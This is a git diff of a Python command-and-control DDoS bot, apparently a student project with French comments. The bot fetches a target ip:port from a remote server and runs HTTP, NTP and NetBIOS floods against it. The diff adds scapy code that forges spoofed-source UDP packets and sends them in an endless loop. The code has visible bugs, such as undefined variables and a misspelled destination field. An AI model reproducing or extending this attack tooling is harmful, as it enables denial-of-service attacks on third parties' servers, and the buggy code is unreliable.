@@ -1,12 +1,13 @@
 """
 ==================================================
-| C&C DDOS By KyaEH, Getwod, Luks, Neowi, 3RW4NFR| 
-| V0.0.2										 | 
-| Repo: https://github.com/kyaEH/C-CDDOS/		 |
+ C&C DDOS By KyaEH, Getwod, Luks, Neowi, 3RW4NFR
+ V0.0.3
+ Repo: https://github.com/kyaEH/C-CDDOS/
 ==================================================
 """
 
 from datetime import datetime
+from scapy.all import *
 import urllib.request,os,sys,time,socket,random#,getpass
 #import winreg as reg 
 #from pathlib import Path
@@ -37,7 +38,7 @@ def checkTime():
 		if timeremaining>5:
 			timeremaining-=5
 		print("Temps restant: {} min".format(5-timeremaining))
-		return False 			#return false, true pour tester
+		return True 			#return false, true pour tester
 	
 
 def waiting():
@@ -54,7 +55,7 @@ def waiting():
 def askOrder():
 	print("C'est l'heure!\nVerification de la cible sur le serveur...")
 	page = urllib.request.urlopen('https://iproc.fr/C&CDDOS/' )
-	ipport= str(page.read()).replace("b",'').replace("'",'')  
+	ipport= str(page.read()).replace("b",'').replace("'",'')  			# On format le résultat de b'ip:port' à ip:port
 	cible = ipport.split(':')
 	if len(cible) != 2:
 		print('Erreur, cible incorrect: "{}"\nNouvel essai dans 10 secondes'.format(ipport))
@@ -75,10 +76,10 @@ def askOrder():
 			ntpFlood(cible[0])
 
 		if cible[1]==137:
-			netbiosFlood()
+			netbiosFlood(cible[0])
 
 		if cible[1]==404:
-			partieBastien()
+			partieBastien(cible[0])
 
 		else:
 			print('Erreur, cible incorrect: "{}"\nNouvel essai dans 1 minute'.format(ipport))
@@ -147,9 +148,12 @@ def httpFlood(cible,port):
 
 		time.sleep(15)
 
-def ntpFlood(cible):
-	print("NTP Flood sur {}".format(cible))
+def ntpFlood(cible, source):
 
+    pkt = IP(dsc=cible, src=source)/UDP(sport=random.randint(1000, 65535),dport=123)/Raw(load=data)
+    send(pkt,loop=1)
+    print("NTP Flood sur {}".format(cible))
+    
 def netbiosFlood(cible):
 	ip = IP(src=RandIP("192.168.1.1/24"), dst=addr)
 	# forge a UDP packet 
@@ -159,8 +163,8 @@ def netbiosFlood(cible):
 	p = ip / udp / raw
 	send(p, loop=1, verbose=0)
 
-def partiebastien():
-	print("Aucunes infos donc jsp")
+def partiebastien(cible):
+	print("NTP Flood sur {}".format(cible))
 
 if __name__=="__main__": 
 	#checkOS()
